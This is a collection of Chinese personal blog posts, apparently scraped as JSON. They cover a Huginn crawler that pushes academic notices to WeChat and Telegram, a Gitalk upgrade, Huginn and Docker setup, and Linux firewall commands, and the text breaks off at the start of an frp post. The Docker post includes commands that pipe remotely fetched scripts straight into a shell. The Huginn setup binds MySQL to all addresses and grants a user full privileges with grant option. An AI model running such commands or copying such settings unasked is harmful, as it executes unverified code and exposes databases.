根据得到的链接，访问相应网址，获得通知具体内容 将得到的信息打包，根据 Server Chan 和 Telegram Bot API 的格式发送即可 创建获取信息的 AgentCrawler_AAO #1 Get Notice URLs 选择 Website Agent，界面如下： Name自己取个喜欢的名字。 Schedule可以指定运行的周期。如果列表里没有合适的选项的话，可以选择Never，再另外创建一个Scheduler Agent，以cron格式自己写一个，然后在Controllers里指向这个Scheduler Agent。 Keep events可以定义获得Events后保留的时间，过期后自动会删除之前的Events。每次爬取后，获得新的数据才作为一个event，否则不会触发一个新的event，可以说在一定程度上起到了去重的作用。（当然如果还有重复的话，可以后面再加一个De-duplication Agent） 如果数据量过大的话最好不要设成Forever。但是要确保在下一个 Agent 能够在 Event 过期之前获取到数据。 Sources就是上一个Agent，Receivers就是下一个Agent。勾选Propagate immediately的话，上一个Agent获取到数据后则立即执行这个Agent，否则会间隔一分钟再执行。（开启会加重CPU负担） Scenarios就是那个Agents的集合啦。 Options里是具体的配置，是JSON的格式，可以参考右边的提示来进行设置。 怎么说好呢，其实简单的参数右边是有了，但是实际配置的时候还是有不少问题。看官方文档吧emmm https://huginnio.herokuapp.com/agents 这里有关于Agents各自API的详细介绍。 下面是options的具体介绍。 Website Agent可以爬取来自url/url_from_event/data_from_event的信息。 type可以xml, html, json, or text。相应的类型有各自的介绍，这里是HTML网页，就用html好了。 mode可以是all, on_change, or merge。If you specify merge for the mode option, Huginn will retain the old payload and update it with new values. 即如果选择merge，则会与之前的信息合并，这个在获取教务通知的具体内容时会用到，之后不再赘述。这里只需要在出现新通知的时候触发，所以用on_change。 extractextract里就是要解析的内容，可以用a CSS selector in css or an XPath expression in xpath. （如果type里选text则可以用regexp正则匹配，然而如果要html提取后再正则匹配就需要再来一个Agent，感觉有点蠢emmm如果有更好的办法欢迎来和我交流一下哈） 要注意的是：这个解析的内容是根据url浏览后直接获得的页面，没有加载文本之外的任何内容，没有经过JavaScript渲染等等。或者说就是你F12在Network里看到的页面加载出来的document或xhr之类得到的response。（这个是在利用 Huginn 爬取其他网站的时候发现的） 如果需要爬取JavaScript加载的网页，可以使用 Phantom Js Cloud Agent，这个需要在PhantomJs Cloud申请一个API，有一定的免费额度。这个Agent会返回页面的相应信息，还可以具体设置输出JSON、截图等等。 extract里以JSON格式写要解析的对象，后面就会返回 相应名字作为Key，相应的值作为Value 的JSON结果。 CSS可以这样找↓，直接复制CSS路径，再进行缩略处理。 比如这里复制出来是 html body div.container-fluid div.main-content.clearfix div.left-content div.notice-announcement div#index_notice_content.tab-content div.tab-pane.active ul.tab-pane-ul li div.inform-content a 然后处理 css path。 原始路径过长，删去不带 . 或 # 的节点（节点间以空格“ ”分割），并删去每个节点在 . 或 #前的第一个标签，得到： .container-fluid .main-content.clearfix .left-content .notice-announcement #index_notice_content.tab-content .tab-pane.active .tab-pane-ul .inform-content a 前半部分对节点定位用处不大，继续缩略，于是得到 .tab-pane.active .tab-pane-ul .inform-content a 非常规情况处理： a. 有些路径中的节点带空格，如&lt;div class=\"packery-item article\"&gt;,路径中的空格由.代替，截取为.packery-item.article b. 当抓取多种 css path 规则时，用逗号,分割 \"css\": \".focus-title .current a , .stress h2 a\", value用来提取标签中的属性，可以利用XPath functions。（中文介绍） Xpath Functions是可以进行嵌套来用的（套娃（x 这里用了 @href来提取链接，用string(.)来提取这个css路径下的字符串，用 normalize-space函数来去除多余的空格。得到的JSON表达式如下。 \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" } } template除了上面这些，还可以设置User Agent，以及一个用**Liquid模板语言编写的模板template**等等。 Liquid markup language. Safe, customer facing template language for flexible web apps. Liquid官方仓库：https://github.com/Shopify/liquid。这里有关于Liquid语法的中文介绍：https://liquid.bootcss.com/。 Liquid也是可以嵌套的，利用管道 | 可以将处理后的结果送到下一个filter。 除了Liquid自带的filter，Huginn还提供了一些自己的用法，详见官方文档 Formatting Events using Liquid。 在这里，由于得到的 href 是相对地址（如 /2020/0208/c11066a193409/page.htm），为了得到绝对地址，在template中利用 {{ url | to_uri: _response_.url }} 进行处理。 （别说了，这几天找遍了XPath function和Liquid用法） 设好之后可以点击Dry Run来试试，看看运行的结果，再做进一步的修改。 于是最终得到的Crawler_AAO #1 Get Notice URLs Options 如下。 { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"http://aao.nuaa.edu.cn/\", \"type\": \"html\", \"mode\": \"on_change\", \"extract\": { \"url\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"@href\" }, \"title\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-content a\", \"value\": \"normalize-space(string(.))\" }, \"time\": { \"css\": \".tab-pane.active .tab-pane-ul .inform-data\", \"value\": \"normalize-space(.)\" } }, \"template\": { \"url\": \"{{ url | to_uri: _response_.url }}\" } } 创建获取内容的 AgentCrawler_AAO #2 Get Notice Contents 一样是Website Agent。 Sources选择第一步创建的Agent，即 Crawler_AAO #1 Get Notice URLs。 Options中的url就来自第一个Agent，于是可以用Liquid中的 {{url}} 。 mode 为 merge，合并之前的信息作为最终的输出。当然也可以利用模板template以及Liquid来调用之前获取的对象。 这里再利用Liquid中的strip_html用法，将所有的html标签去除，最终得到的content就只剩包含\\n的字符串了。（之前试了XPath Function里的normalize-space函数，发现所有文字都连一起了，丑死了emmm 最终得到如下的Options。 { \"expected_update_period_in_days\": \"2\", \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\", \"url\": \"{{url}}\", \"type\": \"html\", \"mode\": \"merge\", \"extract\": { \"content\": { \"css\": \".wp_articlecontent\", \"value\": \".\" } }, \"template\": { \"content\": \"{{ content | strip_html }}\" } } 将通知推送到微信Crawler_AAO #3 WeChat Push 这里利用Server Chan提供的微信模板消息推送服务，之前也写过一篇：小想法 | 基于PushBear API实现微信消息推送。这次再来用一下呢。 现在 PushBear 一对多的推送需要绑定认证过的服务号了，但是个人的推送还是可以用的。 这次用的就是Huginn里的Post Agent啦。 method这个Agent的method可以是get, post, put, patch, and delete，基本的都能实现。 Server Chan那边说是用GET，但好像POST也行。 post_url填写Server Chan的API地址， https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? 这里把API保存到了Credentials里，直接用Liquid模板调用就好了。 content_type这里用form（application/x-www-form-urlencoded）。 payloadAPI接口有两个参数，标题text（必须），描述desp（可选），支持Markdown语法。 这里自己定义就好了啦~ 怎么开心怎么来嘻嘻嘻。 \"payload\": { \"text\": \"【{{title}}】\", \"desp\": \"{{ url }}{% line_break %}{% line_break %}{{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }}\" } 要注意的是：如果直接在它的模板里修改参数信息，则**带有\\的会自动转义为\\\\**！ 因此直接写\\n不可行，而要点击Toggle View然后直接写\\n。或者也可以调用 Huginn 提供的方法 {% line_break %} 。 另一个问题，在Server Chan中\\n\\n才能换行，于是利用 Liquid 的 {{ content | replace: \\\"\\n\\\", \\\"\\n\\n\\\" }} 把\\n给替换成\\n\\n。（需要直接写，不能直接在参数的框里改。 还要注意保存后如果再次修改则\\n又会自动变为\\\\n，注意留意。建议保存之前先Dry Run试试。 emit_events如果设为true，则会返回一个Event，可以再加一个Agent来判断是否发送成功。 例如某次发送成功后得到的Event如下，其中的body部分为返回的数据。 { \"body\": \"{\\\"errno\\\":0,\\\"errmsg\\\":\\\"success\\\",\\\"dataset\\\":\\\"done\\\"}\", \"status\": 200, \"headers\": { \"Server\": \"nginx\", \"Date\": \"Tue, 10 Feb 2020 09:00:51 GMT\", \"Content-Type\": \"text/html;charset=utf-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"Expires\": \"Thu, 01 Jan 1970 00:00:01 GMT\", \"Cache-Control\": \"no-cache, must-revalidate\", \"Pragma\": \"no-cache\", \"Via\": \"100167\", \"Set-Cookie\": \"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly\", \"Content-Length\": 47 } } 将通知推送到Telegram ChannelCrawler_AAO #3 Telegram Channel Push 同样使用的是Post Agent。（看了一下，Telegram Agent好像不大灵活，而且还需要先有一个Event Formatting Agent，让Event中包含either a text, photo, audio, document or video key.） 昨天研究了好久Telegram Bot，看了看官方API文档，发现没有想象中的那么困难233333。 首先 @BotFather 注册一个TGBot，得到token。 这里没有设置Webhook，只需要用到sendMessage方法就好了。 post_urlURL为https://api.telegram.org/bot&lt;token&gt;/sendMessage，将&lt;token&gt;部分换成自己的Bot token，可以保存到Credentials里。 如https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage 可以先用 PostMan 测试一下。 别忘了bot……（是我了 methodPOST or GET content_type URL query string application/x-www-form-urlencoded application/json (except for uploading files) multipart/form-data (use to upload files) payload参数列表如下 也可以使用Markdown语法。（还别说，真挺好 其实还有一个问题，我部署Huginn的服务器是在墙内的，于是还需要想办法转发出去。 具体自己想办法了啦。 （折腾了半天用 heroku 搭了一个自己凑合着用 小结其实最初是想看看Huginn怎么用的，折腾过程中还去看了Liquid模板语法，XPath Functions用法。 推送到微信的前几天就弄好了，昨天想看看TG Bot怎么玩，于是研究了一下Bot API，顺便又写了个推送到TG Channel的。 最终的效果—— 每隔一段时间，Huginn 就会派出一个Agent小兵，去看一看教务有没有新的通知公告。 噢来了呀！Agent带回来了一个新的Event，快把它推给主人吧！ Ding~ 微信来了一条新信息。 TG的Channel那边也来了。 嗯，这个感觉就很棒，朴实无华，且枯燥。（然而并没有钱 emmm 24号开始就要网上上课了。 以上内容仅供学习研究，请勿用于非法用途。 噢对了，TG Channel的邀请链接在这个域名里找嘻嘻嘻—— _tg_aaonotice.miaotony.xyz 就在我部署这篇文章的时候，发现所有的 非代码块内的 Liquid语言全部被hexo认为是代码了emmm 我忘记hexo也用了Liquid了。。（感觉蠢死了 于是把需要在所有的 {{xxx}}和{% xxx %}外面套一层 {% raw %} ... {% endraw %}如果要写上面这个raw，需要写两个（类似于转义）。 Reference Huginn Wiki Formatting Events using Liquid Liquid 中文文档 Huginn Agent 文档 Telegram Bot官方API文档 RSS 进阶篇：Huginn - 真·为任意网页定制 RSS 源（PhantomJs 抓取） Huginn 实现自动通过 Telegram 推送豆瓣高分电影 XPath functions（中文介绍） etc.","path":"2020/02/11/Idea_Huginn_AAONoticeAutoPush/"},{"title":"Blog折腾记 | 升级Gitalk评论插件以解决EmailBombs","text":"起因这几天我的邮箱被 GitHub 轰炸了emmm。 具体大概是这样的—— 说好的 Depending on your API usage, we’ll be sending you this email reminder at most once every 3 days. 然而从2月4日开始每天都有一堆…… 所以这到底是什么回事呢？ 我一想，用到这个 API 的只有我博客的 Gitalk 评论插件。目前我博客的评论都放在了GitHub项目的issue里，每篇文章浏览到下面的时候会自动加载评论，这时候就会向GitHub的API发请求从而获取相应数据。 解决方案于是去 gitalk 的官方仓库看了看，果然2月4日当天就有人提issue了，看来不少人 Email Bombs 了23333（摊手。 https://github.com/gitalk/gitalk/issues/343 很多大佬对这个问题进行了讨论，当然也有不少 +1 Mark之类的在旁观。 方案一2月4日这样，@geektutu 给出了一个 Use read-only personal access token to replace clientID &amp; clientSecret 的方案，并提了PR，详见：#344。这个PR在2月6日merge了。 根据他的建议，首先需要更新 gitalk.min.js文件，如果想获得更多的API使用量，需要在 accessToken 里生成一个只读的token，而后修改 Gitalk 模板里的配置，新增accessToken项。 const gitalk = new Gitalk({ clientID: 'GitHub Application Client ID', clientSecret: 'GitHub Application Client Secret', accessToken: 'Github Personal Access Token', // IMPORTANT !!! repo: 'GitHub repo', owner: 'GitHub repo owner', ... }) 根据 Understanding scopes for OAuth Apps ，在新建 access token 时不选择任何选项，则生成的token只有公开信息的只读权限（*Grants read-only access to public information (includes public user profile info, public repository info, and gists)*）。 6号我也更新了这一版本，做了相应的修改，的确邮箱不被轰炸了。😂 但是，这个 access token 在任何人访问博客的时候都是公开可见的，不免存在风险，这也在issue里有过讨论。@geektutu 也说这是个临时方案。 方案二2月7日，这个issue的发起者 @fletchto99 给出了他的方案，并提了PR，详见：gitalk/gitalk#346 利用原来的client_id 和 client_secret 作为 basic auth 是可行的。 按照他的方案，不需要修改其他的任何配置，直接把Gitalk的js升级到V1.5.2 即可。 这样就方便了很多哈，试了一下果然是可行的。 而且这个可以说是最佳方案了呢！ 针对 Matery 主题的修改方法一对于我现在使用的 Matery 主题（hexo-theme-matery），只需要将 \\hexo\\themes\\matery\\source\\libs\\gitalk目录下的 gitalk.min.js和 gitalk.css 更新到最新版本（&gt;= V1.5.2）即可。 方法二当然也可以修改配置文件里引用的 JavaScript（、CSS）地址为链接版本。 目前 CDN 上的 Gitalk 已经更新到了最新版本。 打开\\hexo\\themes\\matery\\_config.yml，修改其中的 libs。 libs: css: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css # 或者 https://unpkg.com/gitalk/dist/gitalk.css # ... js: # ... gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js # 或者 https://unpkg.com/gitalk/dist/gitalk.min.js # ... 保存后，在 hexo 的目录下执行 hexo clean &amp;&amp; hexo g，再部署即可。 最后，顺手给 hexo-theme-matery 提了个PR，更新了这一依赖，详见 blinkfox/hexo-theme-matery#318 。","path":"2020/02/07/Blog_UpdateGitalk/"},{"title":"基于Docker搭建Huginn","text":"What is Huginn? Huginn is a system for building agents that perform automated tasks for you online. They can read the web, watch for events, and take actions on your behalf. Huginn’s Agents create and consume events, propagating them along a directed graph. Think of it as a hackable version of IFTTT or Zapier on your own server. You always know who has your data. You do. Huginn是一个神器，它是一个私人IFTTT，例如搭建任务采集触发平台，自动跟进实时提醒（用Email Slack Telegeram QQ 微信接收推送），全文 RSS 输出（把你关注的所有网页进行 RSS 全文输出），同时可以把各种app，软件，网络服务，网络设备等链接在一起做任务触发。 官方Github仓库：https://github.com/huginn/huginn 这个是我在玩爬虫的时候，偶然间在网上看到的一个工具，能做的事情还不少，觉得还挺不错的，这次就试着搭建一下吧。 Installation手动安装的话，需要下面这样一步步来，感觉好麻烦……（懒 The Huginn installation consists of setting up the following components: Packages / Dependencies Ruby System Users Database Huginn Nginx 但是，Huginn还提供了一种通过docker来搭建的方式，可以免去配环境的烦恼，感觉贼好~ 官方的文档在这里。 1. 安装 Docker可以参考这里。 2. 安装 Huginn最简单的就直接 docker run -it -p 3000:3000 huginn/huginn 首先会把huginn给pull下来，然后运行。 然后访问 http://localhost:3000 可以看到 3. 登录利用username admin and password password登录，之后可以在Account里进行修改。 4. 配置开机自启docker update --restart=always huginn 好了，接下来就可以尽情感受huginn的魅力了！ Connect to local MySQL上面的安装方法是最简单的，默认会在Docker容器里安装MySQL数据库等环境。 但是如果本机就装了一个MySQL数据库，需要 huginn 共享的话， 或者说想要huginn连接到本地数据库，可以像下面这样安装。 1. 安装 Docker同上。 2. 配置 MySQL2.1 修改绑定的IP为 0.0.0.0这是为了让docker能连接到本地的数据库。 默认的 127.0.0.1 只能从本地访问。 MySQL： vim /etc/mysql/mysql.conf.d/mysqld.cnf 修改 bind-address = 0.0.0.0 然后 重启 sudo systemctl restart mysql MariaDB： /etc/mysql/mariadb.cnf包含了下面的所以.cnf文件 !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ 我这里的在下面这个文件里 vim /etc/mysql/mariadb.conf.d/50-server.cnf 同样修改 bind-address = 0.0.0.0 而后 重启 sudo systemctl restart mysql 2.2 MySQL里新建 huginn 用户当然也可以让huginn直接以root用户来访问数据库，那就直接跳到2.3节。 不过安全起见，还是新建一个用户吧。 以root登录MySQL / MariaDB mysql -u root -p 新建huginn用户，密码为PASSWORD create user 'huginn'@'%' identified by 'PASSWORD'; 这个是允许从任意地方登录。 如果要限制从docker里启动，先ifconfig看下 docker0 的IP，一般是172.17.0.1，则 docker IP 为172.17.0.*，于是 create user 'huginn'@'172.17.0.%' identified by 'PASSWORD'; 2.3 赋予权限GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION; flush privileges; 如果限制访问的数据库则修改*.*为相应的数据库即可。 3. 配置 firewall如果启用了 firewall 的话，需要放行本地的3306端口（即数据库的相应端口）。 Ubuntu： sudo ufw allow 3306 CentOS： sudo firewall-cmd --zone=public --add-port=3306/tcp --permanent # 开放端口 sudo systemctl restart firewalld.service # 重启firewall 4. 安装 Huginn首次安装： docker run --name huginn \\ -p 3000:3000 \\ --restart always \\ -e MYSQL_PORT_3306_TCP_ADDR=172.17.0.1 \\ -e HUGINN_DATABASE_NAME=huginn \\ -e HUGINN_DATABASE_USERNAME=huginn \\ -e HUGINN_DATABASE_PASSWORD=PASSWORD \\ huginn/huginn 这里建了一个名为huginn的数据库。 172.17.0.1是本地的IP，即在ifconfig看到的 docker0 的IP。确保在本地可以通过这个IP连上数据库。 之后直接这样即可↓。 docker start huginn 上面首次安装时已经配置了开机自启。 当然也可以这样配置—— docker update --restart=always huginn 好了，完工！ Referencehttps://github.com/huginn/huginn https://www.jianshu.com/p/d272a09ba686","path":"2020/02/03/Server_Huginn/"},{"title":"Docker安装及常用命令","text":"简介 Building and deploying new applications is faster with containers.Docker containers wrap up software and its dependencies into a standardized unit for software development that includes everything it needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration as simple as sharing a container image. Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 其实感觉上就是emmm 别人把整套环境都配置好打包好了，你直接拿过来用就好了！ 反正用起来贼方便就是了。 感觉docker的图标就挺好看的（ 安装curl -fsSL get.docker.com -o get-docker.sh sudo sh get-docker.sh --mirror Aliyun Windows下下载Docker Desktop https://www.docker.com/products/docker-desktop （要登陆） 换源Linux下，编辑此文件，如果没有则新建。 sudo vim /etc/docker/daemon.json Windows下文件为： %programdata%\\docker\\config\\daemon.json USTC 中科大源（推荐！）https://lug.ustc.edu.cn/wiki/mirrors/help/docker { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } Azure 中国镜像https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy { \"registry-mirrors\": [\"https://dockerhub.azk8s.cn\"] } DaoCloud 源https://www.daocloud.io/mirror { \"registry-mirrors\": [\"http://f1361db2.m.daocloud.io\"] } 或者 直接执行这个就可以一键修改 curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 163网易源{ \"registry-mirrors\": [ \"http://hub-mirror.c.163.com\" ] } 阿里源要注册，略。 配置多个镜像{ \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://dockerhub.azk8s.cn/\", \"http://hub-mirror.c.163.com\" ] } 注意遵循json格式。 配置完之后重启服务sudo systemctl daemon-reload sudo systemctl restart docker 检查加速器是否生效docker info 有如下信息则配置成功。 Portainer Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。 部署# 拉取镜像 docker pull portainer/portainer # 一键部署 docker volume create portainer_data docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer 访问 http://127.0.0.1:9000 即可访问图形化面板。配置好用户名、密码后登录。 连接到Local，登录后的主界面如下。 通过远程访问需要在防火墙放行9000端口。 Ubuntu: sudo ufw allow 9000 CentOS:（其实也可以装个 ufw 的） sudo firewall-cmd --zone=public --add-port=9000/tcp --permanent # 开放端口 sudo systemctl restart firewalld.service # 重启firewall 开机自启docker update --restart=always portainer 其实在上面的一键部署命令中已经加了，这里不需要了。（记录一下而已） 常用命令系统相关查看系统信息docker info 查看镜像、容器、数据卷所占用的空间docker system df 容器相关查看当前容器docker ps -a 有-a则显示所有的容器，包括启动的和未启动的。没有-a的话则只显示运行着的。 创建&amp;使用容器docker run -it --name 容器名 镜像名/镜像ID /bin/bash 使用 -d 参数运行容器，可以让容器在后台运行而不把STDOUT输出到宿主机上。 （用docker logs [container ID or NAMES]查看） 当 -i -t 参数一起使用时，可以看到 Linux 命令提示符，如root@69d137adef7a:/#。只有 -i则没有命令提示符。 启动容器docker start 容器名/容器ID 重启容器docker restart 容器名/容器ID 终止容器docker stop 容器名/容器ID 查看容器信息docker container ls -a 容器统计信息docker stats 启动已终止容器docker container start 获取容器的输出信息docker container logs [container ID or NAMES] 进入容器（连接容器）docker exec -it 容器名/容器ID /bin/bash 从这个 stdin 中 exit，不会导致容器的停止。（推荐↑） 而下面这个，从这个 stdin 中 exit，会导致容器的停止。 docker attach 容器名/容器ID 删除容器docker rm 容器名/容器ID 镜像相关搜索镜像docker search 关键词 下载镜像docker pull 镜像名 镜像名:Tag 可以下载不同标签的镜像。 查看已下载镜像docker images -a # 或者 docker image ls 删除镜像docker rmi [Image ID] 端口相关端口映射将docker内的80端口映射到宿主机的8000端口上 # 可以使用--name自定义部署的容器名 docker run -d -p 8000:80 --name 容器名 镜像名 # 也可以直接通过镜像部署 docker run -d -p 8000:80 镜像名 （别急，慢慢学好了啦…… 拓展阅读Docker从入门到实践 GitBook https://yeasy.gitbooks.io/docker_practice/content/ Docker-镜像常用命令 https://blog.csdn.net/y472360651/article/details/81289088 Docker温故知新 https://www.sqlsec.com/2019/10/docker2.html","path":"2020/02/02/Server_Docker/"},{"title":"Linux Firewall & Port Configuration","text":"前言最近在配服务器环境的时候，动不动遇到端口无法访问的情况，折腾了老半天，经过分析判断最后基本是防火墙把网络端口给拦了…… 于是就来简要记录一下Linux下的防火墙配置，以及端口开放、关闭的配置方法。 整理自网络啦。 CentOSCentOS下用的是firewall-cmd 常用命令启动firewallsystemctl start firewalld.service 开机自启firewallsystemctl enable firewalld.service 查看开机自启是否设置成功systemctl is-enabled firewalld.service; echo $? 返回如下则开启成功 &gt;enabled &gt;0 重启firewallsystemctl restart firewalld.service 关闭firewallsystemctl stop firewalld.service 检测firewall状态firewall-cmd --state 例如正在运行： [root@localhost ~]# firewall-cmd --state running 不在运行则为not running 端口配置查看开放（监听）的端口firewall-cmd --list-ports example： [root@localhost ~]# firewall-cmd --list-ports 80/tcp 7650/tcp 3306/tcp 或 netstat -ntlp 如果没有的话（centos7默认没有 netstat 命令），先安装net-tools。 &gt;yum install -y net-tools &gt;[root@localhost ~]# netstat -ntlp &gt;Active Internet connections (only servers) &gt;Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name &gt;tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 14301/mysqld &gt;tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1840/sshd &gt;tcp6 0 0 :::6011 :::* LISTEN 8037/sshd: root@pts &gt;tcp6 0 0 :::22 :::* LISTEN 1840/sshd &gt;…… 其中tcp为ipv4，tcp6为ipv6. 遇到过几次没有开放firewall端口时，只有tcp6而无tcp的情况，导致访问失败。放行端口后访问正常。 还遇到过只能从本地 127.0.0.1 或 localhost（实际上二者一样的，默认写在了host里）访问，通过（网卡的）IP地址无法访问的情况。表现在 Local Address 上是127.0.0.1:xxxx，通过修改该程序的网络设置把Address修改为对应的IP或 0.0.0.0，即可解决访问的问题。 以下操作之后都要执行 重载 或 重启 才能生效！！！开启特定端口firewall-cmd --zone=public --add-port=80/tcp --permanent # 开放端口 systemctl restart firewalld.service # 重启firewall 其中， 参数含义为--zone 作用域--add-port=80/tcp 添加端口，格式为：端口/通讯协议（tcp或udp）--permanent 永久生效，没有此参数重启后失效 [root@localhost ~]# firewall-cmd --zone=public --add-port=80/tcp --permanent success 成功则返回 success 开放多个端口firewall-cmd --zone=public --add-port=8080-8083/tcp --permanent firewall-cmd --reload # 配置立即生效 关闭特定端口firewall-cmd --zone=public --remove-port=5672/tcp --permanent #关闭5672端口 firewall-cmd --reload # 配置立即生效 # 也可以用restart 针对某个 IP 开放端口firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.142.166\" port protocol=\"tcp\" port=\"6379\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.233\" accept\" 删除某个 IPfirewall-cmd --permanent --remove-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.51\" accept\" 针对一个 IP 段访问firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.0/16\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.0/24\" port protocol=\"tcp\" port=\"9200\" accept\" UbuntuUbuntu 系统默认提供了一个基于iptables之上的防火墙工具ufw。 常用命令安装ufw（默认已安装） sudo apt-get install ufw 启用ufw，且在系统启动时自启sudo ufw enable 关闭ufwsudo ufw disable 查看防火墙状态sudo ufw status 日志系统日志保存于/var/log/ufw.log。LEVEL指定不同的级别 ，默认级别是‘低’ sudo ufw logging on|off LEVEL 端口相关设置默认策略（比如 “mostly open” vs “mostly closed”） sudo ufw default allow # 允许所有外部对本机的访问，且本机访问外部正常。 sudo ufw default deny # 关闭所有外部对本机的访问，但本机访问外部正常。 打开某个端口sudo ufw allow smtp # 允许所有的外部IP访问本机的25/tcp （smtp）端口 sudo ufw allow 22/tcp # 允许所有的外部IP访问本机的22/tcp （ssh）端口 sudo ufw allow 53 # 允许外部访问53端口（tcp/udp） sudo ufw allow from 192.168.1.100 # 允许此IP访问所有的本机端口 sudo ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53 sudo ufw allow in on eth0 from 192.168.0.0/16 # 允许来自192.168.0.0-192.168.255.255的数据通过eth0网卡进入主机 sudo ufw allow out on eth1 to 10.0.0.0/8 # 允许指向10.0.0.0-10.255.255.255的数据通过eth1网卡从本机发出 可以用less /etc/services列出所有服务信息，其中包括该服务使用了哪个端口和哪种协议 关闭端口sudo ufw deny smtp # 禁止外部访问smtp服务 sudo ufw delete allow smtp # 删除上面建立的某条规则 sudo ufw delete allow 80 # 禁止外部访问80端口 sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25 # 拒绝来自10.0.0.0/8域tcp协议指向192.168.0.1端口25的数据进入本机 路由sudo ufw route allow in on eth1 out on eth2 # 允许经eth1进入，eth2发出的数据经本机路由 进程相关命令查看进程的详细信息[root@localhost ~]# ps 1 PID TTY STAT TIME COMMAND 1 ? Ss 7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22 杀死进程kill -9 1234 1234为对应的PID 只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。 下面是常用的信号：HUP 1 终端断线INT 2 中断（同 Ctrl + C）QUIT 3 退出（同 Ctrl + \\）TERM 15 终止KILL 9 强制终止CONT 18 继续（与STOP相反， fg/bg命令）STOP 19 暂停（同 Ctrl + Z） 或者 杀死指定名字的进程（kill processes by name），可以批量结束某个服务程序带有的全部进程。 杀死所有同名进程 killall nginx killall -9 bash 向进程发送指定信号 killall -TERM ngixn # 或者 killall -KILL nginx 命令参数： -Z 只杀死拥有scontext 的进程 -e 要求匹配进程名称 -I 忽略小写 -g 杀死进程组而不是进程 -i 交互模式，杀死进程前先询问用户 -l 列出所有的已知信号名称 -q 不输出警告信息 -s 发送指定的信号 -v 报告信号是否成功发送 -w 等待进程死亡 --help 显示帮助信息 --version 显示版本显示 Referencehttps://blog.csdn.net/zll_0405/article/details/81208606 https://blog.csdn.net/bigdata_mining/article/details/80699180 etc.","path":"2020/01/29/Server_firewall/"},{"title":"基于frp实现内网穿透","text":"前言之前为了实现远程编程，折腾了一阵子autossh，利用反向代理把内网服务器的ssh映射到了公网端口，详见下面这篇。 小想法 | 基于VSCode和ssh实现远程编程/炼丹 这次需求扩大了一点，比如说想访问内网搭建的网站、数据库等等，但这些都不能直接在公网进行访问，autossh就有点不大给力了。 之前还了解过花生壳、ngrok这些，但是一般需要money要限速或者说不大友好，然后一想大家都在推荐frp，这回就来折腾一下吧！（主要是以后忘了还可以回来看嘻嘻 总体感受就是，**frp搭建起来比autossh方便多了**呀！ 简介What is frp? frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports TCP and UDP, as well as HTTP and HTTPS protocols, where requests can be forwarded to internal services by domain name. frp also has a P2P connect mode. frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。 FRP，fast reverse proxy。使用 Go 语言开发，支持 Windows、Linux、macOS、ARM 等多平台部署。 其实简单地说也就是借助一台有公网IP的服务器作为中转，把内外网直接的流量连接起来。 其开源仓库：https://github.com/fatedier/frp What should I prepare?内网主机（客户端）：能上互联网（外网），或者说能连上你的公网服务器就行。（但没有公网IP） 可以是电脑（Windows，MacOS，Linux）/嵌入式设备（如树莓派）…对的，frp跨平台。 公网主机（服务端）：有公网IP，或者绑定了域名能通过端口访问也行。 以及 想连接内网的你喜欢的设备。 搭建过程分为服务器端和客户端两部分。 下载程序根据对应的操作系统及架构，从 Release 页面下载最新版本的程序。 目前最新的版本是 v0.31.1 